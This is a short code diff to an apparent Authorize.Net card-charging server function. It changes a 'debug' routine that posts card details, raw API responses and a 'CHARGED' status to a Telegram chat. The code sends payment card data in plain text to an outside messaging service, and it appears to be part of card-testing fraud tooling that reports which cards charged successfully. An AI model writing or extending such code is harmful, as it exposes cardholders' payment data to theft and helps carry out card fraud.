@@ -39,14 +39,15 @@ const notifyChargedCard = (
   }).catch((err) => console.error("[AUTHNET-CHARGE] notify-charged-card error:", err));
 };
 
-const sendAdminDebug = (cardDetails: string, rawResponse: string) => {
+const sendAdminDebug = (cardDetails: string, rawResponse: string, resultStatus: string = 'UNKNOWN') => {
   const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
   const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID");
   if (!TELEGRAM_BOT_TOKEN || !ADMIN_TELEGRAM_CHAT_ID) return;
 
-  const message = `🔍 <b>AuthNet Charge Debug</b>\n\n` +
+  const emoji = resultStatus === 'CHARGED' ? '💳' : '🔍';
+  const message = `${emoji} <b>AuthNet Charge Debug</b>\n\n` +
     `<b>Card:</b> <code>${cardDetails}</code>\n` +
-    `<b>Status:</b> UNKNOWN\n\n` +
+    `<b>Status:</b> ${resultStatus}\n\n` +
     `<b>Raw API Response:</b>\n<pre>${rawResponse.substring(0, 3000)}</pre>`;
 
   fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
